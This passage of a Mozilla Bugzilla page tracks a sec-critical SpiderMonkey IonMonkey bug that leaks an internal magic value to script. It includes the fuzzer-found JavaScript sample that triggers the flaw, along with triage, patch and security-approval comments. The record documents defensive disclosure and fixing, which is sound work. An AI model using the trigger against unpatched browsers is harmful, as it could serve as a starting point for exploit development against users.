        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-1" data-comment-id="13964420" data-ismarkdown="true" ><p>Small typo: between the first two CFG graphs, it should say &quot;... and decides that block 2 (or really the exit from the loop in v8) should be pruned&quot; (block 2 instead of 3).</p>
</div></div><div class="change-set" id="c2"><div class="comment" data-id="13964425" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_375297" id="a81_159069"><img src="https://secure.gravatar.com/avatar/709c5feed942bf99f098bb24aa1cc86f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_375297" id="a81_159069"><a class="email " href="/user_profile?user_id=375297" > <span class="fna">Jan de Mooij [:jandem]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 04:15 PST" data-time="1551788116">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-2" data-comment-id="13964425" data-ismarkdown="true" ><p>NI nbp because it looks related to pranch pruning.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(nicolas.b.pierron)</div></div></div><div class="change-set" id="c3"><div class="comment" data-id="13964443" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_634439" id="a81_159069"><img src="https://secure.gravatar.com/avatar/dd173269d2ae1dd60942eeb75caaef98?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_634439" id="a81_159069"><a class="email " href="/user_profile?user_id=634439" > <span class="fna">Samuel Groß</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 04:28 PST" data-time="1551788922">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-3" data-comment-id="13964443" data-ismarkdown="true" ><p>For completeness, here is the original sample found during fuzzing:</p>
<pre><code>// run with --no-threads

function main() {
    const v1 = typeof parseInt;
    const v3 = v1 === &quot;function&quot;;
    for (let v7 = 0; v7 &lt; 4; v7++) {
        function v8(v9,v10) {
            let v13 = 0;
            do {
                const v14 = v13 + 1;
                v13 = v14;
            } while (v13 &lt; 1337);
        }
        const v15 = v8();
        const v17 = [13.37,13.37];
        for (let v21 = 0; v21 &lt; 7; v21++) {
            for (let v25 = 0; v25 &lt; 100; v25++) {
                if (v3) {
                } else {
                    const v26 = {get:v8};
                    for (let v30 = 0; v30 &lt; 100; v30++) {
                    }
                }
            }
        }
    }
}
main();
</code></pre>
</div></div><div class="change-set" id="c4"><div class="comment" data-id="13964671" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a81_159069"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a81_159069"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 06:25 PST" data-time="1551795942">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-4" data-comment-id="13964671" data-ismarkdown="true" ><p>Thanks a lot, this analysis is really useful and will allow us to fix this issues at multiple stages of the program.</p>
<p>(In reply to Samuel Groß from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c0" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment #0</a>)</p>
<blockquote>
<p>With any fix, please give credit for identifying the vulnerability to Samuel Groß of Google Project Zero.</p>
</blockquote>
<p>I will!</p>
</div><div class="activity"><div class="change">Assignee: nobody &rarr; nicolas.b.pierron</div><div class="change">Status: UNCONFIRMED &rarr; ASSIGNED</div><div class="change">Ever confirmed: true</div><div class="change">Flags: <span class="activity-deleted">needinfo?(nicolas.b.pierron)</span></div></div></div><div class="change-set" id="c5"><div class="comment" data-id="13964751" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a81_159069"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a81_159069"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 06:52 PST" data-time="1551797527">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-5" data-comment-id="13964751" data-ismarkdown="true" ><p>FlagPhiInputsAsHavingRemovedUses got rewritten in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1489142" title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time">Bug 1489142</a>, which most likely introduced this bug by changing the logic of the function, by adding the DepthFirstSearchUse.</p>
<p>The issue might be present on esr60, we should double check it as the algorithm was different.</p>
</div><div class="activity"><div class="change">Blocks: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - FlagAllOperandsAsHavingRemovedUses can take a very long time"
   href="/show_bug.cgi?id=1489142">1489142</a></div><div class="change">Severity: normal &rarr; critical</div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox65&amp;o1=isnotempty">status-firefox65</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox65&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=isnotempty">status-firefox66</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox66&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=isnotempty">status-firefox67</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox67&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=%3F">?</a></div><div class="change">Priority: -- &rarr; P1</div></div></div><div class="change-set" id="c6"><div class="comment" data-id="13965159" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a81_159069"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a81_159069"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 09:02 PST" data-time="1551805335">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9048557"
         class="attachment"
         data-id="9048557" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D22120-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9048557" itemprop="contentUrl">
        <span id="att-9048557-description" itemprop="description">(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.</span></a>
        — <a href="attachment.cgi?id=9048557&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c7"><div class="comment" data-id="13965164" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a81_159069"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a81_159069"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 09:04 PST" data-time="1551805477">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-7" data-comment-id="13965164" data-ismarkdown="true" ><p>(In reply to Nicolas B. Pierron [:nbp] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c6" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment #6</a>)</p>
<blockquote>
<p>Created <span class=""><a href="/attachment.cgi?id=9048557" name="attach_9048557" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">attachment 9048557</a> <a href="/attachment.cgi?id=9048557&amp;action=edit" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Force expected crashes on unexpected magic values.</p>
</blockquote>
<p>This patch prevent leveraging a non-matching magic value to become exploitable, by forcing SpiderMonkey to crash on unexpected magic values.</p>
<p>I will now look at branch pruning issue.</p>
</div></div><div class="change-set" id="a18902_422187"><div class="change" id="aa18902_422187">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a18902_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_422187" id="a18902_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a18902_422187"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a18902_422187">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a18902_422187">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-05 09:23 PST" data-time="1551806603">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a></div></div></div><div class="change-set" id="c8"><div class="comment" data-id="13968475" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a18902_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a18902_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-06 08:01 PST" data-time="1551888082">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-8" data-comment-id="13968475" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9048557" name="attach_9048557" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">attachment 9048557</a> <a href="/attachment.cgi?id=9048557&amp;action=edit" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">[details]</a></span><br>
(central &amp; beta) <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Force expected crashes on unexpected magic values.</p>
<h3>Security Approval Request</h3>
<ul>
<li><strong>How easily could an exploit be constructed based on the patch?</strong>: Hardly based on this one, it hint at miss-interpreted magic value, but it would be a long and involve process to figure out the issue reported in this bug.</li>
<li><strong>Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?</strong>: No</li>
<li><strong>Which older supported branches are affected by this flaw?</strong>: all</li>
<li><strong>If not all supported branches, which bug introduced the flaw?</strong>: None</li>
<li><strong>Do you have backports for the affected branches?</strong>: Yes</li>
<li><strong>If not, how different, hard to create, and risky will they be?</strong>: The same patch should apply to all branches.</li>
<li><strong>How likely is this patch to cause regressions; how much testing does it need?</strong>: Unlikely, this patch converts a debug assertion to a release assertion in order to prevent this bug from being exploitable.<br>
(A proper patch to fix the original issue is coming soon but would be more risky)</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9048557&amp;action=edit"
           title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9048557</a> -
        Flags: sec-approval?</div></div></div><div class="change-set" id="c9"><div class="comment" data-id="13969276" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a18902_422187"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a18902_422187"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-06 12:22 PST" data-time="1551903764">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-9" data-comment-id="13969276" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9048557" name="attach_9048557" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">attachment 9048557</a> <a href="/attachment.cgi?id=9048557&amp;action=edit" title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values.">[details]</a></span><br>
(central &amp; beta) <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">Bug 1532599</a> - Force expected crashes on unexpected magic values.</p>
<p>Sec-approval+ for trunk. We&#39;ll want beta and ESR60 patches ASAP as well. We&#39;re cutting an RC soon.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9048557&amp;action=edit"
           title="(central &amp; beta) Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9048557</a> -
        Flags: sec-approval? &rarr; sec-approval+</div></div></div><div class="change-set" id="c10"><div class="comment" data-id="13969281" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a18902_422187"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a18902_422187"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-06 12:23 PST" data-time="1551903815">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-10" data-comment-id="13969281" data-ismarkdown="true" ><p>Actually, I see ESR60 is marked &quot;?&quot; in status but you say &quot;all&quot; versions in the sec-approval. We should determine if this affects ESR60 or not.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox65&amp;o1=isnotempty">status-firefox65</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox65&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox65&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=isnotempty">tracking-firefox66</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox66&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=isnotempty">tracking-firefox67</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox67&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">Flags: needinfo?(nicolas.b.pierron)</div></div></div><div class="change-set" id="c11"><div class="comment" data-id="13970921" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a18902_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a18902_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 03:00 PST" data-time="1551956418">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-11" data-comment-id="13970921" data-ismarkdown="true" ><p>(In reply to Al Billings [:abillings] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1532599#c10" title="RESOLVED FIXED - Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script">comment #10</a>)</p>
<blockquote>
<p>Actually, I see ESR60 is marked &quot;?&quot; in status but you say &quot;all&quot; versions in the sec-approval. We should determine if this affects ESR60 or not.</p>
</blockquote>
<p>I do not know if the Branch Pruning issue is affecting esr60 or not. However, the miss-interpreted Magic value which is used to leverage the original bug and convert it into an exploitable bug can safely be backported to all versions. (as we have been asserting for a very long time that this condition was supposed to be true)</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(nicolas.b.pierron)</span></div></div></div><div class="change-set" id="c12"><div class="comment" data-id="13970924" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a18902_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a18902_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 03:02 PST" data-time="1551956560">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-12" data-comment-id="13970924" data-ismarkdown="true" ><p>Setting the leave-open keyword for the moment as the current patch which is going to be landed is not the Branch Pruning patch but a way to prevent us from making the branch pruning issue exploitable.</p>
<p>I am currently working on a branch pruning fix, which is unfortunately much more complex.</p>
</div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=leave-open&amp;resolution=---">leave-open</a></div></div></div><div class="change-set" id="c13"><div class="comment" data-id="13970934" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a18902_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_422187" id="a18902_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 03:11 PST" data-time="1551957092">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9049131"
         class="attachment"
         data-id="9049131" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D22477-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9049131" itemprop="contentUrl">
        <span id="att-9049131-description" itemprop="description">Bug 1532599 - Force expected crashes on unexpected magic values.</span></a>
        — <a href="attachment.cgi?id=9049131&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="a169421_422187"><div class="change" id="aa169421_422187">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_422187" id="a169421_422187"><img src="https://secure.gravatar.com/avatar/f78625fe5901300b4689355a8e507ea2?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_422187" id="a169421_422187"><a class="email " href="/user_profile?user_id=422187" > <span class="fna">Nicolas B. Pierron [:nbp]</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a169421_422187"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a169421_422187">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1532599#a169421_422187">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-07 03:12 PST" data-time="1551957122">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9049131&amp;action=edit"
           title="Bug 1532599 - Force expected crashes on unexpected magic values."
           class=""
        >Attachment #9049131</a> -
        Attachment description: Bug 1532599 - Force expected crashes on unexpected magic values. &rarr; (esr60) Bug 1532599 - Force expected crashes on unexpected magic values.</div></div></div><div class="change-set" id="a169445_422187"><div class="change" id="aa169445_422187">
